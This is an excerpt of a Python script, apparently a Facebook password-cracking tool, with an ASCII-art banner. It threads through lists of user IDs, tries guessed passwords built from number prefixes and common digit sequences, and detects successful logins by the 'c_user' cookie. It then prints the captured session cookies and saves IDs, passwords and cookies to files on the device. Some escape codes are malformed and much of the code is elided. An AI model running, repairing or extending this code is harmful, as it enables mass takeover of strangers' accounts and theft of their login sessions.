...
╱╱┃┃╱┃╭━━┫╰━╯┃┃┃┃┃┃╱╱┃╭╯┃┃
╱╱┃┃╱┃╰━━┫╭━╮┃┃┃┃┃┃╱╱┃┃╭╯╰╮
╱╱╰╯╱╰━━━┻╯╱╰┻╯╰╯╰╯╱╱╰╯╰━━╯  \033[1;97mV\033[1;32m/\033[1;97m11.1                 
...
def v2():
    ...
    with ThreadPool(max_workers=30) as akash:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080','102030','203040','304050','405060','506070','607080','708090','809010']
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sIFAT\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[IFAT-OK] {cid}|{ps}")
                print('\033[1;91m[033[1;97mCOOKIE-🌺033[1;91m] = 033[1;33m{coki}')
                open('/sdcard/IFAT-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[IFAT-CP💔] {uid}|{ps}")
                open('/sdcard/IFAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
